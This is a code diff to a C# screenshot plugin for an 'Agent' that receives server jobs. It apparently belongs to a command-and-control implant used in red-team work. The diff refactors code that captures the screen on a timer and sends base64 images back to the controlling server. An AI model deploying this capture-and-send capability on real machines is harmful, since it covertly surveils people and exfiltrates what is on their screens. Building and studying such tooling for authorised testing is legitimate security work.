@@ -18,19 +18,21 @@ namespace Agent
     {
         public string Name => "screenshot";
         private IMessageManager messageManager { get; set; }
-        private System.Timers.Timer screenshotTimer;
+        private System.Timers.Timer? screenshotTimer;
         public CancellationTokenSource cts = new CancellationTokenSource();
 
-        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner)
+        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner, IPythonManager pythonManager)
         {
             this.messageManager = messageManager;
         }
 
+        [System.Runtime.Versioning.SupportedOSPlatform("windows")]
         public async Task Execute(ServerJob job)
         {
-            int intervalInSeconds = 0; // Default interval should be 0 to just take one
-
             ScreenshotArgs args = JsonSerializer.Deserialize<ScreenshotArgs>(job.task.parameters);
+            if(args is null){
+                return;
+            }
 
             if (args.interval <= 0)
             {
@@ -52,7 +54,7 @@ namespace Agent
                 // Set AutoReset to false for a one-time execution if the interval is greater than 0
                 screenshotTimer.AutoReset = args.interval > 0;
                 screenshotTimer.Enabled = true;
-                await messageManager.AddResponse(new TaskResponse
+                messageManager.AddTaskResponse(new TaskResponse
                 {
                     completed = true,
                     user_output = $"Capturing screenshots every {args.interval} seconds!!.",
@@ -60,7 +62,7 @@ namespace Agent
                 });
             }
         }
-
+        [System.Runtime.Versioning.SupportedOSPlatform("windows")]
         private async Task CaptureAndSendScreenshot(string task_id)
         {
             try
@@ -109,7 +111,7 @@ namespace Agent
                 }
 
                 var combinedBitmapBase64 = Convert.ToBase64String(outputBytes);
-                await messageManager.AddResponse(new TaskResponse
+                messageManager.AddTaskResponse(new TaskResponse
                 {
                     completed = true,
                     user_output = "Screenshot captured.",
@@ -119,11 +121,11 @@ namespace Agent
             }
             catch (Exception e)
             {
-                await messageManager.Write($"Failed to capture screenshot: {e.ToString()}", task_id, true, "error");
+                messageManager.Write($"Failed to capture screenshot: {e.ToString()}", task_id, true, "error");
             }
         }
     }
-
+    [System.Runtime.Versioning.SupportedOSPlatform("windows")]
     internal class ScreenCapture
     {
         internal static List<Bitmap> Capture()
